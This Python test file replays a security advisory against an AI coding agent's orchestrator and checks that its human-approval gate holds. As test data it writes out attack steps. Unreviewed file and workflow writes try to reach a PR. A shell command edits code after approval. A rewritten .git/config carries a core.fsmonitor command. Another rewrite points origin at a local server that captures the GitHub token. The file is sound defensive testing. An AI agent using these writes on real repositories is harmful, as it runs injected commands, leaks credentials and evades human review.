"""
GHSA-vhjw-gfmx-j3fx, replayed through the real CodeFix orchestrator.

The reporter's proof of concept called github_write directly. These tests run the
whole session instead: `CodeFixOrchestrator.run()` with a scripted model, the real
clone, commit and push code (git's `url.<base>.insteadOf`, set in the environment,
sends the github.com URL to a local bare repository), and "Require approval" on.
Nothing here depends on the fix's own seams, so the same tests run against the
code before it. There, each attack below ended with a branch pushed and a PR opened:

- the reporter's: github_write overwrites a file and adds a workflow file, nobody
  approves, and both reach the PR. Now: two approval prompts, both time out and
  are rejected, nothing is pushed;
- a github_bash command appends to a file after its edit was accepted, and the
  append reached the PR. Now: the PR carries the accepted content;
- github_write rewrites `.git/config` with a `core.fsmonitor` command, which the
  agent's own `git add` ran as root. Now: the write is refused, the command never runs;
- github_write points `origin` at another host, and the push sent that host the
  GitHub token. Now: refused, and the token goes nowhere.

The unit tests of each guarantee are in test_ghsa_vhjw_codefix_review_gate.py.
Reported by @mappygrid and, in GHSA-8whg-rvcr-r88r, by @recuon.

Run: ./agentic/run_tests.sh tests/test_ghsa_vhjw_codefix_orchestrator_replay.py
"""
import asyncio
import base64
import contextlib
import http.server
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from cypherfix_codefix import orchestrator as orch_module  # noqa: E402
from cypherfix_codefix.orchestrator import CodeFixOrchestrator  # noqa: E402
from cypherfix_codefix.state import CodeFixState  # noqa: E402
from cypherfix_codefix.tools import github_repo  # noqa: E402
from decision_check import DecisionCheck  # noqa: E402

GIT = shutil.which("git")
TOKEN = "dummy-token-ghsa-vhjw"
GITHUB_URL = "https://x-access-token@github.com/acme/widgets.git"
BRANCH = "cypherfix/rem-1"
APP = "def handler(q):\n    return db.execute('SELECT * FROM t WHERE id=' + q)\n"
FIXED = "def handler(q):\n    return db.execute('SELECT * FROM t WHERE id=?', (q,))\n"
READ = ("github_read", {"file_path": "app.py"})
EDIT = ("github_edit", {"file_path": "app.py", "old_string": "' + q)", "new_string": "?', (q,))"})
ORIGINAL_AWAIT = CodeFixOrchestrator._await_block_approval


def git(cwd, *args):
    return subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *args],
        cwd=cwd, check=True, capture_output=True, text=True,
    ).stdout


async def nobody_answers(self, timeout=300):
    """The real wait, cut short: it times out, and a timeout rejects."""
    return await ORIGINAL_AWAIT(self, timeout=0.2)


async def person_accepts(self, timeout=300):
    return {"decision": "accept"}


def scripted(steps):
    remaining = iter(steps)

    async def _call_llm(self, system, messages):
        uses = next(remaining, [])
        if not uses:
            return {"content": [{"type": "text", "text": "done"}],
                    "stop_reason": "end_turn", "tool_uses": []}
        return {"content": [{"type": "text", "text": "working"}], "stop_reason": "tool_use",
                "tool_uses": [{"id": f"t{i}", "name": name, "input": args}
                              for i, (name, args) in enumerate(uses)]}
    return _call_llm


class _Callback:
    def __init__(self):
        self.events = []

    def __getattr__(self, name):
        if name.startswith("__"):
            raise AttributeError(name)

        async def record(*args, **kwargs):
            self.events.append((name, args, kwargs))
        return record

    def phases(self):
        return [args[0] for name, args, _ in self.events if name == "on_phase"]

    def outcome(self):
        return [args[1] for name, args, _ in self.events if name == "on_complete"]

    def tool_output(self, tool):
        return [args[2] for name, args, _ in self.events
                if name == "on_tool_complete" and args[0] == tool]


class _TokenCollector(http.server.BaseHTTPRequestHandler):
    """A host a rewritten `origin` could name: asks for credentials and keeps them."""

    received = []

    def do_GET(self):
        auth = self.headers.get("Authorization")
        if auth:
            _TokenCollector.received.append(base64.b64decode(auth.split()[1]).decode())
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="x"')
        self.end_headers()

    def log_message(self, *args):
        pass


@unittest.skipUnless(GIT, "git is not installed")
class TestCodeFixSessionReplay(unittest.TestCase):
    def setUp(self):
        self.root = Path(self.enterContext(tempfile.TemporaryDirectory()))
        self.work = self.root / "work"
        self.origin = self._origin()
        self.updates = []

    def _origin(self) -> Path:
        seed = self.root / "seed"
        seed.mkdir()
        git(seed, "init", "-q", "-b", "main")
        (seed / "app.py").write_text(APP, encoding="utf-8")
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "base")
        bare = self.root / "origin.git"
        git(self.root, "clone", "-q", "--bare", str(seed), str(bare))
        return bare

    def _manager(self):
        work = self.work

        class LocalRepoManager(github_repo.GitHubRepoManager):
            """The real clone/commit/push, in this test's work dir; no PR API."""

            def __init__(self, *args, **kwargs):
                super().__init__(*args, **kwargs)
                self.work_dir = work / self.work_dir.name

            def create_pr(self, title, body, branch, base=None):
                return {"pr_url": f"https://example.invalid/pull/{branch}", "pr_number": 1,
                        "branch": branch, "title": title}
        return LocalRepoManager

    def session(self, steps, approval=nobody_answers, sandbox=False):
        work, updates = self.work, self.updates

        async def settings(project_id):
            return {"github_repo": "acme/widgets", "github_token": TOKEN,
                    "default_branch": "main", "require_approval": True,
                    "model": "scripted/model", "max_iterations": 8}

        async def remediation(_self, rid):
            return {"projectId": "p1", "title": "SQL injection in handler"}

        async def update(_self, rid, data):
            updates.append(data)

        async def no_llm(_self):
            return None

        async def spawn(job_id):
            if not sandbox:
                raise RuntimeError("no build sandbox in this replay")

        async def teardown(job_id):
            return None

        async def run_bash(job_id, command, timeout=600):
            # The sandbox bind-mounts this same worktree read-write.
            done = subprocess.run(["sh", "-c", command], cwd=work / job_id / "repo",
                                  capture_output=True, text=True)
            return {"output": done.stdout + done.stderr, "exit_code": done.returncode}

        patches = (
            mock.patch.dict(os.environ, {
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_KEY_0": f"url.{self.origin.as_uri()}.insteadOf",
                "GIT_CONFIG_VALUE_0": GITHUB_URL,
            }),
            mock.patch.object(orch_module, "load_cypherfix_settings", settings),
            mock.patch.object(orch_module, "GitHubRepoManager", self._manager()),
            mock.patch.object(orch_module, "authorize_decision",
                              mock.AsyncMock(return_value=DecisionCheck(allowed=True))),
            mock.patch.object(orch_module.sandbox_client, "spawn", spawn),
            mock.patch.object(orch_module.sandbox_client, "teardown", teardown),
            mock.patch.object(orch_module.sandbox_client, "run_bash", run_bash),
            mock.patch.object(CodeFixOrchestrator, "_load_remediation", remediation),
            mock.patch.object(CodeFixOrchestrator, "_update_remediation", update),
            mock.patch.object(CodeFixOrchestrator, "_init_llm", no_llm),
            mock.patch.object(CodeFixOrchestrator, "_call_llm", scripted(steps)),
            mock.patch.object(CodeFixOrchestrator, "_await_block_approval", approval),
        )
        state = CodeFixState()
        state.project_id, state.session_id, state.remediation_id = "p1", "s1", "rem-1"
        callback = _Callback()
        state.streaming_callback = callback
        with contextlib.ExitStack() as stack:
            for patch in patches:
                stack.enter_context(patch)
            asyncio.run(CodeFixOrchestrator(state, callback).run("rem-1"))
        return state, callback

    def pushed(self, path="app.py"):
        done = subprocess.run(["git", "show", f"{BRANCH}:{path}"], cwd=self.origin,
                              capture_output=True, text=True)
        return done.stdout if done.returncode == 0 else None

    def worktree(self):
        return self.work / "rem-1" / "repo"

    # -- control -------------------------------------------------------------

    def test_control_an_unanswered_edit_is_rejected_and_nothing_is_pushed(self):
        state, cb = self.session([[READ], [EDIT]])
        self.assertIn("awaiting_approval", cb.phases())
        self.assertEqual(cb.outcome(), ["no_fix"])
        self.assertIsNone(self.pushed())

    def test_control_an_accepted_edit_reaches_the_pr(self):
        state, cb = self.session([[READ], [EDIT]], approval=person_accepts)
        self.assertEqual(cb.outcome(), ["pr_created"])
        self.assertEqual(self.pushed(), FIXED)

    # -- the advisory --------------------------------------------------------

    def test_reporters_attack_unreviewed_writes_wait_for_a_person_and_never_ship(self):
        state, cb = self.session([
            [("github_write", {"file_path": "app.py", "content": "# UNREVIEWED CONTENT\n"})],
            [("github_write", {"file_path": ".github/workflows/poc.yml", "content": "on: push\n"})],
        ])
        self.assertEqual(cb.phases().count("awaiting_approval"), 2)
        self.assertEqual([b.status for b in state.diff_blocks], ["rejected", "rejected"])
        self.assertEqual(cb.outcome(), ["no_fix"])
        self.assertIsNone(self.pushed(), "a branch was pushed with changes nobody approved")
        self.assertEqual((self.worktree() / "app.py").read_text(), APP)
        self.assertFalse((self.worktree() / ".github" / "workflows" / "poc.yml").exists())

    def test_an_accepted_write_reaches_the_pr_exactly_as_shown(self):
        state, cb = self.session(
            [[("github_write", {"file_path": "app.py", "content": FIXED})]],
            approval=person_accepts)
        self.assertEqual(cb.outcome(), ["pr_created"])
        self.assertEqual([(b.status, b.new_code) for b in state.diff_blocks], [("accepted", FIXED)],
                         "the write was never shown for review")
        self.assertEqual(self.pushed(), FIXED)

    # -- found while verifying -----------------------------------------------

    def test_a_command_after_approval_does_not_reach_the_pr(self):
        append = ("github_bash", {"command": "printf 'import os  # after review\\n' >> app.py"})
        state, cb = self.session([[READ], [EDIT], [append]],
                                 approval=person_accepts, sandbox=True)
        self.assertEqual(cb.outcome(), ["pr_created"])
        self.assertEqual(self.pushed(), FIXED, "a change made after review reached the PR")
        self.assertIn("app.py", self.updates[-1]["agentNotes"])

    def test_a_rewritten_git_config_never_runs_its_command(self):
        marker = self.root / "MARKER"
        config = f'[core]\n\tbare = false\n\tfsmonitor = "touch {marker}; true"\n'
        state, cb = self.session([
            [("github_write", {"file_path": ".git/config", "content": config})],
            [READ], [EDIT],
        ], approval=person_accepts)
        self.assertFalse(marker.exists(), "the agent's git ran a command from .git/config")
        self.assertIn(".git directory", cb.tool_output("github_write")[0])
        self.assertEqual(cb.outcome(), ["pr_created"])
        self.assertNotIn("fsmonitor", (self.worktree() / ".git" / "config").read_text())
        self.assertEqual(self.pushed(), FIXED)

    def test_a_rewritten_origin_never_receives_the_token(self):
        server = http.server.HTTPServer(("127.0.0.1", 0), _TokenCollector)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        _TokenCollector.received = []
        config = (f'[core]\n\tbare = false\n[remote "origin"]\n'
                  f'\turl = http://127.0.0.1:{server.server_port}/acme/widgets.git\n')
        state, cb = self.session([
            [("github_write", {"file_path": ".git/config", "content": config})],
            [READ], [EDIT],
        ], approval=person_accepts)
        self.assertEqual(_TokenCollector.received, [], "the GitHub token went to another host")
        self.assertIn(".git directory", cb.tool_output("github_write")[0])
        self.assertEqual(cb.outcome(), ["pr_created"])
        self.assertEqual(self.pushed(), FIXED, "the push went to the configured repository")


if __name__ == "__main__":
    unittest.main()
